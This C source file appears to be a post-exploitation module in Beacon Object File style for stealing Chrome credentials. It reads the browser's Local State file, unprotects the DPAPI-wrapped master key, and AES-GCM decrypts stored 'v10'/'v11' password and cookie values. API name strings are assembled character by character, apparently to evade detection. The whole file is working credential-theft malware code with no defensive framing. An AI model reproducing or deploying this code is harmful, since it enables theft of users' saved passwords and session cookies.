#include "plg_common.h"

HANDLE PLG_heap;

WINBASEAPI HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL);
#ifndef LOCALFREE
#define LOCALFREE(p) KERNEL32$LocalFree((HLOCAL)(p))
#endif

static int plg_b64_val(unsigned char c) {
	if (c >= 'A' && c <= 'Z') return c - 'A';
	if (c >= 'a' && c <= 'z') return c - 'a' + 26;
	if (c >= '0' && c <= '9') return c - '0' + 52;
	if (c == '+') return 62;
	if (c == '/') return 63;
	return -1;
}

int plg_b64_decode(const char *in, unsigned char *out, size_t outsz, size_t *written) {
	size_t i, o = 0;
	int v[4], k, pad = 0;
	*written = 0;
	for (i = 0; in[i] && in[i] != '='; ) {
		for (k = 0; k < 4 && in[i]; k++) {
			if (in[i] == '\r' || in[i] == '\n') {
				i++;
				k--;
				continue;
			}
			if (in[i] == '=') {
				pad++;
				v[k] = 0;
				i++;
				continue;
			}
			v[k] = plg_b64_val((unsigned char)in[i++]);
			if (v[k] < 0)
				return -1;
		}
		if (k < 4)
			break;
		if (o < outsz)
			out[o++] = (unsigned char)((v[0] << 2) | (v[1] >> 4));
		if (pad < 2 && o < outsz)
			out[o++] = (unsigned char)((v[1] << 4) | (v[2] >> 2));
		if (pad < 1 && o < outsz)
			out[o++] = (unsigned char)((v[2] << 6) | v[3]);
	}
	*written = o;
	return 0;
}

int plg_read_file_a(const char *path, unsigned char **out, DWORD *outlen) {
	HANDLE h;
	DWORD sz, rd;
	unsigned char *buf;
	h = KERNEL32$CreateFileA(path, GENERIC_READ,
	    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
	    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (h == INVALID_HANDLE_VALUE)
		return -1;
	sz = KERNEL32$GetFileSize(h, NULL);
	if (sz == INVALID_FILE_SIZE || sz == 0 || sz > 100 * 1024 * 1024) {
		KERNEL32$CloseHandle(h);
		return -1;
	}
	buf = (unsigned char *)plg_alloc(sz + 1);
	if (!buf) {
		KERNEL32$CloseHandle(h);
		return -1;
	}
	if (!KERNEL32$ReadFile(h, buf, sz, &rd, NULL) || rd != sz) {
		plg_free(buf);
		KERNEL32$CloseHandle(h);
		return -1;
	}
	KERNEL32$CloseHandle(h);
	buf[sz] = 0;
	*out = buf;
	*outlen = sz;
	return 0;
}

static int plg_scan_encrypted_key(const char *text, char *outb64, size_t osz) {
	const char *p = text;
	const char *k = MSVCRT$strstr(p, "\"encrypted_key\"");
	if (!k)
		k = MSVCRT$strstr(p, "encrypted_key");
	if (!k)
		return -1;
	p = MSVCRT$strchr(k, ':');
	if (!p)
		return -1;
	p = MSVCRT$strchr(p, '"');
	if (!p)
		return -1;
	p++;
	{
		size_t i = 0;
		while (*p && *p != '"' && i + 1 < osz)
			outb64[i++] = *p++;
		outb64[i] = 0;
		return (int)i;
	}
}

int plg_chrome_master_key(const char *local_state_path, unsigned char key32[32]) {
	unsigned char *buf = NULL;
	DWORD len = 0;
	char b64[8192];
	size_t decsz;
	unsigned char dec[512];
	DATA_BLOB inblob, outblob;
	if (plg_read_file_a(local_state_path, &buf, &len) < 0)
		return -1;
	if (plg_scan_encrypted_key((char *)buf, b64, sizeof(b64)) < 0) {
		plg_free(buf);
		return -1;
	}
	plg_free(buf);
	if (plg_b64_decode(b64, dec, sizeof(dec), &decsz) < 0)
		return -1;
	if (decsz < 6 || MSVCRT$memcmp(dec, "DPAPI", 5) != 0) {
		return -1;
	}
	inblob.pbData = dec + 5;
	inblob.cbData = (DWORD)(decsz - 5);
	outblob.pbData = NULL;
	outblob.cbData = 0;
	if (!CRYPT32$CryptUnprotectData(&inblob, NULL, NULL, NULL, NULL, 0, &outblob)) {
		return -1;
	}
	if (outblob.cbData < 32) {
		if (outblob.pbData)
			LOCALFREE(outblob.pbData);
		return -1;
	}
	MSVCRT$memcpy(key32, outblob.pbData, 32);
	if (outblob.pbData)
		LOCALFREE(outblob.pbData);
	return 0;
}

static NTSTATUS plg_aes_gcm_decrypt(const unsigned char *key32, const unsigned char *iv12,
	const unsigned char *payload_after_iv, ULONG paylen, unsigned char *pt, ULONG *ptlen) {
	BCRYPT_ALG_HANDLE hA = NULL;
	BCRYPT_KEY_HANDLE hK = NULL;
	NTSTATUS st;
	ULONG kl = 0, objlen = 0, r = 0;
	unsigned char *keyobj = NULL;
	unsigned char tag[16];
	const unsigned char *body;
	ULONG bodylen;
	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
	if (paylen < 16)
		return (NTSTATUS)0xC0000001L;
	bodylen = paylen - 16;
	body = payload_after_iv;
	MSVCRT$memcpy(tag, payload_after_iv + bodylen, 16);
	{
		wchar_t w1[8] = { 'A', 'E', 'S', 0 };
		wchar_t w2[20] = { 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', ' ', 'P', 'r', 'i', 'm', 'i', 't', 'i', 'v', 'e', 0 };
		st = BCRYPT$BCryptOpenAlgorithmProvider(&hA, w1, w2, 0);
	}
	if (st)
		goto end;
	{
		wchar_t chain[] = { 'C', 'h', 'a', 'i', 'n', 'i', 'n', 'g', 'M', 'o', 'd', 'e', 0 };
		wchar_t gcm[] = { 'C', 'h', 'a', 'i', 'n', 'i', 'n', 'g', 'M', 'o', 'd', 'e', 'G', 'C', 'M', 0 };
		st = BCRYPT$BCryptSetProperty(hA, chain, (PUCHAR)gcm, sizeof(gcm), 0);
	}
	if (st)
		goto end;
	{
		wchar_t wol[] = { 'O', 'b', 'j', 'e', 'c', 't', 'L', 'e', 'n', 'g', 't', 'h', 0 };
		st = BCRYPT$BCryptGetProperty(hA, wol, (PUCHAR)&objlen, sizeof(objlen), &kl, 0);
	}
	if (st)
		goto end;
	keyobj = (unsigned char *)plg_alloc(objlen);
	if (!keyobj) {
		st = (NTSTATUS)0xC0000017L;
		goto end;
	}
	st = BCRYPT$BCryptGenerateSymmetricKey(hA, &hK, keyobj, objlen, (PUCHAR)key32, 32, 0);
	if (st)
		goto end;
	MSVCRT$memset(&ai, 0, sizeof(ai));
	ai.cbSize = sizeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO);
	ai.dwInfoVersion = 1;
	ai.pbNonce = (PUCHAR)iv12;
	ai.cbNonce = 12;
	ai.pbAuthData = NULL;
	ai.cbAuthData = 0;
	ai.pbTag = tag;
	ai.cbTag = 16;
	r = *ptlen;
	st = BCRYPT$BCryptDecrypt(hK, (PUCHAR)body, bodylen, &ai, NULL, 0, pt, r, &r, 0);
	*ptlen = r;
end:
	if (hK)
		BCRYPT$BCryptDestroyKey(hK);
	if (hA)
		BCRYPT$BCryptCloseAlgorithmProvider(hA, 0);
	plg_free(keyobj);
	return st;
}

int plg_chrome_decrypt(const unsigned char *master32, const char *val_b64,
	const unsigned char *raw, size_t rawlen, unsigned char *out, size_t *outlen, int is_b64) {
	unsigned char tmp[65536];
	size_t n = sizeof(tmp);
	const unsigned char *p = tmp;
	size_t plen;
	if (is_b64 && val_b64) {
		if (plg_b64_decode(val_b64, tmp, sizeof(tmp), &plen) < 0)
			return -1;
	} else if (raw && rawlen) {
		if (rawlen > sizeof(tmp))
			return -1;
		MSVCRT$memcpy(tmp, raw, rawlen);
		plen = rawlen;
	} else
		return -1;
	if (plen >= 3 && p[0] == 'v' && p[1] == '1' && (p[2] == '0' || p[2] == '1')) {
		ULONG olen = (ULONG)*outlen;
		if (plen < 31 || !master32)
			return -1;
		if (plg_aes_gcm_decrypt(master32, p + 3, p + 15, (ULONG)(plen - 15), out, &olen) != 0)
			return -1;
		*outlen = olen;
		return 0;
	}
	{
		DATA_BLOB inb, outb;
		inb.pbData = (BYTE *)p;
		inb.cbData = (DWORD)plen;
		outb.pbData = NULL;
		outb.cbData = 0;
		if (!CRYPT32$CryptUnprotectData(&inb, NULL, NULL, NULL, NULL, 0, &outb))
			return -1;
		if (outb.cbData > *outlen) {
			LOCALFREE(outb.pbData);
			return -1;
		}
		MSVCRT$memcpy(out, outb.pbData, outb.cbData);
		*outlen = outb.cbData;
		LOCALFREE(outb.pbData);
		return 0;
	}
}
